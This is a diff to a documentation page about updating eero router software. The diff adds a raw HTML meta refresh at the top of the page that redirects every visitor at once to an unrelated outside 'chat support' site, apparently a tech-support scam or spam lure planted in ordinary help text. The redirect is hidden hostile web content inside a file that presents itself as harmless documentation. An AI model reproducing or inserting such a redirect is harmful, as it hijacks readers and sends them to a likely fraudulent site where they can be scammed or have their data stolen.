@@ -1,7 +1,10 @@
+
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://getchatsupport.live/">
+
 How to Update Eero Software?
 =========================
-
-
 Keeping your home network secure, fast, and reliable is a top priority for any modern household. One of the key elements in achieving this is ensuring that your networking equipment, particularly your eero system, is regularly updated. This guide provides detailed information about the eero software update process, why it's important, and how to ensure your system stays current.
 
 .. image:: update.gif
